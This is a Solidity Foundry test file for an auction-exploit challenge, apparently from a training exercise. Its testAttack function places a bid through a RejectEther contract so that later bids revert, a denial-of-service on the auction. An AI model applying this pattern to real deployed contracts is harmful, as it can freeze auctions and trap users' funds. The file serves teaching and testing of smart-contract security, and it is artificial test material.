// SPDX-License-Identifier: MIT
pragma solidity ^0.8.25;

import "forge-std/Test.sol";
import {Auction} from "src/exploits/auction/Auction.sol";
import {RejectEther} from "src/exploits/auction/RejectEther.sol";

contract AuctionChallenge is Test {
    Auction public auction;
    RejectEther public rejectEther;
    address public bidder = vm.addr(1);
    address public challenger = vm.addr(2);

    function setUp() public {
        auction = new Auction();
        rejectEther = new RejectEther(address(auction));

        vm.deal(bidder, 3 ether);

        // bidder makes a bid
        vm.startPrank(bidder);
        auction.makeBid{value: 1 ether}();
        vm.stopPrank();

        vm.deal(challenger, 2 ether);
    }

    function testPreCheck() public view {
        assertEq(auction.getHighestBidAmount(), 1 ether);
        assertEq(auction.getHighestBidAddress(), bidder);
        assertEq(address(challenger).balance, 2 ether);
    }

    function testAttack() public {
        vm.startPrank(challenger);

        /**
         * Execute the attack here
         */
        rejectEther.makeBidInAuction{value: 2 ether}();

        // DO NOT REMOVE
        vm.stopPrank();

        // bidder attempts to make another bid
        vm.startPrank(bidder);
        vm.expectRevert();
        auction.makeBid{value: 3 ether}();
    }

    fallback() external payable {}
    receive() external payable {}
}
